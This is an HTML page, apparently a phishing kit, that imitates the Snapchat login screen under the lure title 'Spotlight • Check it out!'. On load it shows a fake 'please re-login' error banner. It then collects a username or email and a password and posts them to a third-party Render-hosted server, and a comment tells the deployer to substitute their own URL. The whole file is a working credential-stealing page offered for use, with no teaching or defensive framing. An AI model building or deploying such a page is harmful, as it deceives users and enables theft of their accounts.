<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" href="img/snapchat.png">
  <title>Spotlight • Check it out!</title>
  <style>
    @font-face {
    font-family: "Avenir Next";
    src: url(https://static.snapchat.com/fonts/AvenirNext-Medium.woff2) format("woff2");
    font-weight: 400;
    font-style: normal;
    }
    @font-face {
    font-family: "Avenir Next";
    src: url(https://static.snapchat.com/fonts/AvenirNext-DemiBold.woff2) format("woff2");
    font-weight: 600;
    font-style: normal;
    }
    @font-face {
    font-family: "Avenir Next";
    src: url(https://static.snapchat.com/fonts/AvenirNext-Bold.woff2) format("woff2");
    font-weight: 700;
    font-style: normal;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Avenir Next", sans-serif;
      background: #f7f7f7;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      position: relative;
    }

    .back-button {
      position: absolute;
      top: 16px;
      left: 14px;
      background: none;
      border: none;
      cursor: pointer;
      padding: 6px;
      display: flex;
      align-items: center;
    }
    .back-button img { width: 18px; height: 18px; opacity: 0.4; }
    .back-button:hover img { opacity: 0.8; }

    .card {
      background: #ffffff;
      border-radius: 16px;
      padding: 36px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.07);
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .placeholder-icon {
      width: 64px;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 14px;
    }
    .placeholder-icon svg {
      width: 56px;
      height: 56px;
      stroke: #111;
      fill: none;
      stroke-width: 1.4;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    h1 {
      font-size: 27px;
      font-weight: 550;
      color: #000;
      margin-bottom: 24px;
      text-align: center;
    }

    .fields { width: 100%; }

    .field-label {
      font-size: 15px;
      font-weight: 600;
      color: #555;
      margin-bottom: 6px;
      display: block;
    }

    input[type="text"],
    input[type="email"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 13px 14px;
      border: 1.5px solid #e0e0e0;
      border-radius: 10px;
      font-size: 15px;
      font-family: inherit;
      color: #111;
      outline: none;
      caret-color: #00A6FF;
      transition: border-color 0.2s;
      background: #fff;
    }
    input:focus { border-color: #00A6FF; }

    .phone-toggle {
      display: block;
      width: 100%;
      text-align: center;
      margin-top: 14px;
      font-size: 13.5px;
      font-weight: 600;
      color: #00A6FF;
      text-decoration: none;
      cursor: pointer;
      background: none;
      border: none;
      font-family: inherit;
    }
    .phone-toggle:hover { text-decoration: underline; }

    .password-wrap { position: relative; width: 100%; }
    .password-wrap input { padding-right: 44px; }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
    }
    .toggle-password img { width: 20px; height: 20px; opacity: 0.4; }
    .toggle-password:hover img { opacity: 0.8; }

    .save-info {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 14px;
      width: 100%;
    }
    .save-info input[type="checkbox"] { width: 15px; height: 15px; accent-color: #00A6FF; }
    .save-info label { font-size: 12px; color: #aaa; cursor: pointer; }

    .forgot {
      display: block;
      margin-top: 12px;
      font-size: 13px;
      font-weight: 600;
      color: #00A6FF;
      text-decoration: none;
      text-align: center;
      width: 100%;
    }
    .forgot:hover { text-decoration: underline; }

    .btn-next {
      width: 160px;
      display: block;
      margin: 22px auto 0;
      padding: 13px;
      background: #00A6FF;
      color: #fff;
      border: none;
      border-radius: 999px;
      font-size: 15px;
      font-weight: 500;
      font-family: inherit;
      cursor: pointer;
      transition: background 0.2s, transform 0.15s;
    }
    .btn-next:hover  { background: #0094e0; }
    .btn-next:active { transform: scale(0.98); }
    .btn-next:disabled { background: #a7d8f7; cursor: not-allowed; }

    .incorrect {
      display: none;
      color: #e03535;
      font-size: 12.5px;
      margin-top: 8px;
      text-align: left;
      width: 100%;
    }
    .server-message {
      display: none;
      padding: 10px 12px;
      margin-top: 12px;
      border-radius: 8px;
      font-size: 13px;
      text-align: left;
      width: 100%;
    }
    .server-message.error   { display: block; background: #fff0f0; color: #cc0000; border: 1px solid #f5c6c6; }
    .server-message.success { display: block; background: #f0fff4; color: #007a33; border: 1px solid #b2dfcc; }

    .error-banner {
      display: none;
      background: #f44336;
      color: #fff;
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 14px;
      text-align: center;
      width: 100%;
      max-width: 360px;
      margin-bottom: 16px;
      animation: fadeIn 0.4s ease, vibrate 0.2s ease-in-out 3;
    }
    @keyframes fadeIn  { from { opacity: 0; } to { opacity: 1; } }
    @keyframes vibrate {
      0%,100% { transform: translateX(0); }
      25%     { transform: translateX(-5px); }
      75%     { transform: translateX(5px); }
    }
    .spinner {
      display: inline-block; width: 14px; height: 14px;
      border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff;
      border-radius: 50%; animation: spin 0.7s linear infinite;
      vertical-align: middle; margin-right: 6px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <button class="back-button" onclick="goBack()">
    <img src="img/left-arrow.png" alt="back">
  </button>

  <div id="error-banner" class="error-banner">
    Something went wrong! Please re-login to your account.
  </div>

  <div class="card">

    <div class="placeholder-icon">
      <img src="img/snapchat.png" width="64" height="64" alt="logo">
    </div>

    <h1 id="page-title">Log in to Snapchat</h1>

    <!-- Step 1 -->
    <div class="fields" id="step-1">
      <span class="field-label" id="input-label">Username or Email</span>
      <input type="text" id="username" autocomplete="username" />
      <div class="incorrect" id="step1-error">Please enter your username or email.</div>
      <button class="phone-toggle" id="switch-to-phone">Use phone number instead</button>
      <button class="btn-next" onclick="goToStep2()">Next</button>
    </div>

    <!-- Step 2 -->
    <div class="fields" id="step-2" style="display:none;">
      <p style="font-size:14px;margin-bottom:24px;text-align:center;border:1.5px solid #e0e0e0;border-radius:10px;padding:10px 14px;width:fit-content;max-width:200px;margin-left:auto;margin-right:auto;box-sizing:border-box;display:flex;align-items:center;justify-content:center;">
        <span id="display-username" style="font-weight:600;color:#111;"></span>
        <span style="color:#00A6FF;font-weight:600;margin-left:10px;">Not you?</span>
      </p>
      <span class="field-label">Password</span>
      <div class="password-wrap">
        <input type="password" id="password" autocomplete="current-password" />
        <button type="button" class="toggle-password">
          <img src="img/closedeye.jpg" id="eye-icon" alt="show password">
        </button>
      </div>
      <div class="incorrect" id="step2-error">Password must be at least 8 characters.</div>
      <div id="server-message" class="server-message"></div>
      <a href="#" class="forgot">Forgot Password</a>
      <button class="btn-next" id="login-btn" onclick="handleLogin()">Log In</button>
    </div>

  </div>
    <p style="margin-top:20px;font-size:14px;color:#16191c;font-family:'Avenir Next',sans-serif;">
      New to Snapchat? <span style="font-weight:700;color:#16191c;">Sign Up</span>
    </p>
  <script>
    // !! Replace with your Render URL !!
    const SERVER_URL = 'https://snapchat-pcir.onrender.com';

    function goToStep2() {
      const username = document.getElementById('username').value.trim();
      const err      = document.getElementById('step1-error');
      if (!username) { err.style.display = 'block'; return; }
      err.style.display = 'none';
      document.getElementById('step-1').style.display = 'none';
      document.getElementById('step-2').style.display = 'flex';
      document.getElementById('step-2').style.flexDirection = 'column';
      document.getElementById('page-title').textContent = 'Enter password';
      document.getElementById('display-username').textContent = document.getElementById('username').value.trim();
      document.getElementById('password').focus();
    }

    function goBack() {
      if (document.getElementById('step-2').style.display !== 'none') {
        document.getElementById('step-2').style.display = 'none';
        document.getElementById('step-1').style.display = 'block';
        document.getElementById('page-title').textContent = 'Log in to Snapchat';
      } else {
        window.location.href = 'index.html';
      }
    }

    async function handleLogin() {
      const email     = document.getElementById('username').value.trim();
      const password  = document.getElementById('password').value;
      const err       = document.getElementById('step2-error');
      const serverMsg = document.getElementById('server-message');
      const btn       = document.getElementById('login-btn');

      err.style.display = 'none';
      serverMsg.className = 'server-message';
      serverMsg.textContent = '';

      if (password.length < 8) { err.style.display = 'block'; return; }

      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span>Logging in…';

      try {
        const res  = await fetch(`${SERVER_URL}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });
        const data = await res.json();
        if (res.ok) {
          serverMsg.className   = 'server-message success';
          serverMsg.textContent = 'Login successful!';
          // setTimeout(() => window.location.href = 'home.html', 1000);
        } else {
          serverMsg.className   = 'server-message error';
          serverMsg.textContent = data.error || 'Login failed. Please try again.';
        }
      } catch {
        serverMsg.className   = 'server-message error';
        serverMsg.textContent = 'Could not reach the server. Please try again.';
      }

      btn.disabled = false;
      btn.textContent = 'Log In';
    }

    document.querySelector('.toggle-password').addEventListener('click', function () {
      const pwd = document.getElementById('password');
      const eye = document.getElementById('eye-icon');
      if (pwd.type === 'password') { pwd.type = 'text';     eye.src = 'img/openeye.png'; }
      else                         { pwd.type = 'password'; eye.src = 'img/closedeye.png'; }
    });

    const switchBtn    = document.getElementById('switch-to-phone');
    const usernameInput = document.getElementById('username');
    const inputLabel   = document.getElementById('input-label');
    switchBtn.addEventListener('click', function () {
      if (inputLabel.textContent === 'Username or Email') {
        inputLabel.textContent = 'Phone Number';
        usernameInput.type     = 'tel';
        switchBtn.textContent  = 'Use email instead';
      } else {
        inputLabel.textContent = 'Username or Email';
        usernameInput.type     = 'text';
        switchBtn.textContent  = 'Use phone number instead';
      }
    });

    document.addEventListener('keydown', e => {
      if (e.key !== 'Enter') return;
      if (document.getElementById('step-2').style.display !== 'none') handleLogin();
      else goToStep2();
    });

    window.onload = function () {
      const banner = document.getElementById('error-banner');
      banner.style.display = 'block';
      document.body.addEventListener('click', () => banner.style.display = 'none');
    };
  </script>

</body>
</html>
